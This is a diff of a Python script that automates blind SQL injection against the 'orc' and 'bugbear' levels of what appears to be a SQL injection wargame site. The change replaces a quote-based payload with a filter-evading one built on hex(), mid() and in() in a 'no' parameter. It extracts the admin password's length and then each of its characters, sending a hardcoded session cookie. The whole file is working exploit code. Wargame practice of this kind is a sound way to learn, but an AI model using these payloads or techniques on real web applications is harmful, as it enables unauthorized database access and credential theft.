@@ -1,6 +1,6 @@
-import requests
+import requests, urllib
 
-url = "https://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw="
+url = "https://los.eagle-jump.org/bugbear_431917ddc1dec75b4d65a23bd39689f8.php"
 
 cookie = {"PHPSESSID":"oj8l6aabt4juigeiduqcn1jl73"}
 
@@ -8,8 +8,9 @@ cookie = {"PHPSESSID":"oj8l6aabt4juigeiduqcn1jl73"}
 
 plen = 1
 while True:
-    response = requests.get(url + "a' or id='admin' and length(pw)=" + str(plen) + "-- -", cookies=cookie)
-    if "<h2>Hello admin</h2>" in response.text:
+    param = {"pw": "a", "no" : "0||hex(mid(id,1,1))in(61)&&length(pw)<>" + str(plen)}
+    response = requests.get(url, params=param, cookies=cookie)
+    if "<h2>Hello admin</h2>" not in response.text:
         break
     else:
         print("[*] trying get password length.. now " + str(plen))
@@ -22,7 +23,8 @@ password = ""
 for i in range(plen):
     for j in range(256):
         j = j + 32 % 256
-        response = requests.get(url + "a' or id='admin' and ord(substr(pw, " + str(i+1) + ", 1))=" + str(j) +"-- -", cookies=cookie)
+        param = {"pw": "a", "no" : "0||hex(mid(id,1,1))in(61)&&hex(mid(pw," + str(i+1) + ",1))in(" + str(hex(j)).replace("0x", "")+")"}
+        response = requests.get(url, params=param, cookies=cookie)
         if "<h2>Hello admin</h2>" in response.text:
             password += chr(j)
             break
